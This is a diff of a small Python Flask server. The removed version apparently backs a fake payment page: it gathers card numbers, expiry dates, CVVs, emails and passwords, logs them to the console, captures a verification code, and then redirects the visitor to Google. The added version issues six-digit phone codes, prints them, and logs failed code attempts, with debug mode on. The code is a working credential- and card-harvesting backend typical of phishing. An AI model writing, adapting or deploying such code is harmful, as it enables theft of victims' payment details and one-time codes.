@@ -1,60 +1,63 @@
-from flask import Flask, render_template, request, redirect
-import os
+from flask import Flask, request, jsonify, send_from_directory
+import random
+import string
 import time
+
 app = Flask(__name__)
 
-@app.route("/test")
-def test():
-    return "Flask is working"
+# Store codes temporarily
+codes = {}
+
+def make_code():
+    return ''.join(random.choices(string.digits, k=6))
 
 @app.route("/")
 def home():
-    return render_template("payment.html")
+    return send_from_directory(".", "index.html")
 
-@app.route("/verifying.html")
-def verifying():
-    return render_template("verifying.html")
+@app.route("/api/send_code", methods=["POST"])
+def send_code():
+    data = request.get_json()
+    phone = data.get("phone", "").strip()
 
-@app.route("/verify.html")
-def verify():
-    return render_template("verify.html")
+    if not phone:
+        return jsonify({"success": False})
 
-@app.route("/process-payment", methods = ["POST"])
-def process_payment():
-    email = request.form.get("email")
-    cardholder = request.form.get("cardholder")
-    cardnumber = request.form.get("card_number")
-    expiry = request.form.get("expiry")
-    pin = request.form.get("cvv")
-    password = request.form.get("password")
+    code = make_code()
+    codes[phone] = {
+        "code": code,
+        "time": time.time()
+    }
 
-    print("Email:", email)
-    print("Cardholder:", cardholder)
-    print("Card Number:", cardnumber)
-    print("Expiry: ", expiry)
-    print("Pin: ",pin)
-    print("Password: ", password)
-    print(request.form, flush=True)
-    
-    
+    # Print clearly in terminal
+    print("\n" + "="*40)
+    print(f"PHONE NUMBER : {phone}")
+    print(f"CODE         : {code}")
+    print("="*40 + "\n")
 
-    return redirect("/verifying.html") 
+    return jsonify({"success": True})
 
-
-@app.route("/verify-code", methods=["POST"])
+@app.route("/api/verify_code", methods=["POST"])
 def verify_code():
-    code = request.form.get("code")
-    print("code:", code)
-    print(request.form, flush=True)
-    # save code...
+    data = request.get_json()
+    phone = data.get("phone", "").strip()
+    code = data.get("code", "").strip()
 
-    return redirect("https://www.google.com")
+    record = codes.get(phone)
 
+    if not record or record["code"] != code:
+        print(f"\nFAILED attempt → Phone: {phone} | Code tried: {code}\n")
+        return jsonify({"success": False})
 
-    
+    # Success
+    print("\n" + "="*40)
+    print(f"VERIFIED SUCCESSFULLY")
+    print(f"Phone: {phone}")
+    print("="*40 + "\n")
+
+    del codes[phone]
+    return jsonify({"success": True})
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
-    
-
-
+    print("Server running at http://localhost:5000")
+    app.run(host="127.0.0.1", port=5000, debug=True)
